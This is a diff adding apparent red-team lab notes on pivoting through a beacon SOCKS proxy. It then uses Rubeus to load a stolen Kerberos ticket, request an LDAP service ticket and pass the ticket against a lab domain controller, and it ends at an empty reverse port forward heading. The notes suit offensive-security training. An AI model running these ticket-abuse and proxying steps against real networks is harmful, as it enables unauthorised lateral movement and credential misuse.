@@ -1,0 +1,16 @@
+Socks Proxy
+start socks
+- beacon> socks 1080 (choose port you want)
+- Linux we need to configure proxy chains
+- windows we use proxifier
+
+Kerberos requires DNS host names and not IPs
+PS C:\Users\Attacker> Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1' <-- add static entries into the hosts file. 
+
+To use kerberos tickets  with a proxy 
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:rsteel /password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /show
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:C:\Users\Attacker\Desktop\rsteel.kirbi /dc:lon-dc-1 /ptt
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
+
+Reverse Port Fowards
